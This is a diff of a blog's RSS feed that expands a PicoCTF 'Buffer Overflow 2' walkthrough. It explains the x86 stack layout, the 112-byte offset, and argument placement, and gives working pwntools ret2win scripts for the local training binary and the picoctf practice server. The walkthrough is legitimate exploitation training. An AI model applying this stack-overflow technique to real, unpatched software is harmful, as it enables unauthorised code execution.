@@ -1,24 +1,23 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
   <channel>
     <title>Code Review on Ep1cac</title>
-    <link>http://localhost:1313/tags/code-review/</link>
+    <link>https://ep1cac.github.io/tags/code-review/</link>
     <description>Recent content in Code Review on Ep1cac</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
     <copyright>Ep1cac</copyright>
-    <lastBuildDate>Wed, 09 Oct 2024 14:23:13 -0500</lastBuildDate><atom:link href="http://localhost:1313/tags/code-review/index.xml" rel="self" type="application/rss+xml" /><icon>http://localhost:1313/logo.svg</icon>
+    <lastBuildDate>Wed, 09 Oct 2024 14:23:13 -0500</lastBuildDate><atom:link href="https://ep1cac.github.io/tags/code-review/index.xml" rel="self" type="application/rss+xml" /><icon>https://ep1cac.github.io/logo.svg</icon>
     
     
     <item>
       <title>PicoCTF: Buffer Overflow 2</title>
-      <link>http://localhost:1313/posts/pico_buff2/</link>
+      <link>https://ep1cac.github.io/posts/pico_buff2/</link>
       <pubDate>Wed, 09 Oct 2024 14:23:13 -0500</pubDate>
       
-      <guid>http://localhost:1313/posts/pico_buff2/</guid>
+      <guid>https://ep1cac.github.io/posts/pico_buff2/</guid>
       <description><![CDATA[<h3 id="description">Description</h3>
-<p>Buffer Overflow 2 is a&hellip;</p>
+<p>Buffer Overflow 2 is a binary exploitation challenge that involves overflowing a buffer to not only call the win() function, but also to successfully pass the necessary arguments to it.</p>
 <h3 id="walkthrough">Walkthrough</h3>
-<h4 id="foreward">Foreward</h4>
 <p>After downloading the vulnerable binary and its source code, the first thing I did was to view the source code.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
@@ -70,8 +69,7 @@ call <code>win()</code> as well as pass in two arguments, <code>0xCAFEF00D</code
 <p>We can also see that we need a dummy flag in order for the program to execute correctly.</p>
 <pre tabindex="0"><code>┌──(kali㉿kali)-[~/Writeups/pico/buff2]
 └─$ echo &#39;pico{debug}&#39; &gt; flag.txt
-</code></pre><h4 id="exploitation">Exploitation</h4>
-<p>To overflow the buffer, we first need to find the offset of the eip pointer. eip stands for
+</code></pre><p>To overflow the buffer, we first need to find the offset of the eip register. eip stands for
 &ldquo;Extended Instruction Pointer&rdquo; and as its name suggests, points to the next instruction to be
 executed in x86 systems. We want to write the address of <code>win()</code> to it. To find the address,
 we can analyze <code>vuln</code> in gdb&hellip;</p>
@@ -81,11 +79,12 @@ we can analyze <code>vuln</code> in gdb&hellip;</p>
 <p><img src="/img/pico/buff2/vuln_gets_alloc.png" alt="GDB vuln buffer size"></p>
 <p>Notice that the address of offset <code>ebp-0x6c</code> is pushed onto the stack and is
 read by <code>gets()</code>. This means that after calling the <code>gets</code> function, there will be
-108 (0x6c) bytes of buffer between the start of the buffer and the <code>ebp</code> pointer.</p>
+108 (0x6c) bytes of buffer between the start of the buffer and the <code>ebp</code> register. Note
+that the 108 bytes allocated differ from the 100-byte buffer declared in <code>vuln.c</code>.
+Discrepancies like this are usually caused by padding or local variables.</p>
 <div style="display: flex; justify-content: center;">
     <table>
-        <td style="text-align: center;">
-            <table>
+        <table>
   <thead>
       <tr>
           <th style="text-align: left">High Address</th>
@@ -113,16 +112,16 @@ read by <code>gets()</code>. This means that after calling the <code>gets</code>
   </tbody>
 </table>
 
-        </td>
     </table>
 </div>
-<p><code>eip</code> is at a higher address immediately after <code>ebp</code>. Since pointers are 4 bytes on x86 binaries,
+<p><code>eip</code> is at a higher address immediately after <code>ebp</code>. Since <code>ebp</code> is a 4 byte register,
 <code>eip</code> is 112 (108 + 4) bytes from the start of the buffer. We will therefore need 112 bytes of padding
-before in our payload before it starts overwriting <code>eip</code>.</p>
+in our payload before <code>eip</code> starts being overwritten.</p>
 <p>Preliminary payload: 112 bytes padding + address of win().</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
 </span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
@@ -175,11 +174,11 @@ at the <code>win()</code> function through gdb. If <code>win()</code> is called,
 </span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
 </span></span></code></pre></div><p><img src="/img/pico/buff2/win_stop.png" alt="win() function stop"></p>
 <p>We do break, meaning our exploit successfully called <code>win()</code>. Now, we need to add
-the arguments <code>0XCAFEF00D</code> and <code>0XF00DF00D</code>.</p>
+the arguments <code>0XCAFEF00D</code> and <code>0XF00DF00D</code>. Let us take a look at the stack
+frame for <code>win()</code>.</p>
 <div style="display: flex; justify-content: center;">
     <table>
-        <td style="text-align: center;">
-            <table>
+        <table>
   <thead>
       <tr>
           <th style="text-align: left">High Address</th>
@@ -210,9 +209,74 @@ the arguments <code>0XCAFEF00D</code> and <code>0XF00DF00D</code>.</p>
   </tbody>
 </table>
 
-        </td>
     </table>
 </div>
+<p>Unlike x64 binaries, all function arguments in x86 programs are passed directly onto the stack.
+After jumping to <code>win()</code>, we will also need to overflow <code>eip</code> before we can pass in arg1 and arg2.
+In my exploit script I set <code>eip</code> to be overflowed with the address of <code>main()</code> for the sake of
+having a valid return address, but any 4 byte value should work since the flag is being printed directly in <code>win()</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> buffer_size <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>addr_win <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;win&#34;</span>])
+</span></span><span style="display:flex;"><span>addr_main <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;main&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>arg1 <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xCAFEF00D</span>)
+</span></span><span style="display:flex;"><span>arg2 <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xF00DF00D</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload_list <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        padding,
+</span></span><span style="display:flex;"><span>        addr_win,
+</span></span><span style="display:flex;"><span>        addr_main,
+</span></span><span style="display:flex;"><span>        arg1,
+</span></span><span style="display:flex;"><span>        arg2
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(payload_list)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p><img src="/img/pico/buff2/local_flag.png" alt="Local binary flag"></p>
+<p>Our exploit was successful. Now all that&rsquo;s left to do is to change the target from
+the local binary to the remote pico server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;saturn.picoctf.net&#34;</span>, <span style="color:#ae81ff">54042</span>) <span style="color:#75715e"># Changed from binary to pico server.</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./vuln&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> buffer_size <span style="color:#f92672">*</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>addr_win <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;win&#34;</span>])
+</span></span><span style="display:flex;"><span>addr_main <span style="color:#f92672">=</span> p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;main&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>arg1 <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xCAFEF00D</span>)
+</span></span><span style="display:flex;"><span>arg2 <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xF00DF00D</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload_list <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        padding,
+</span></span><span style="display:flex;"><span>        addr_win,
+</span></span><span style="display:flex;"><span>        addr_main,
+</span></span><span style="display:flex;"><span>        arg1,
+</span></span><span style="display:flex;"><span>        arg2
+</span></span><span style="display:flex;"><span>        ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(payload_list)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p><img src="/img/pico/buff2/flag.png" alt="Pico flag"></p>
 ]]></description>
       
     </item>
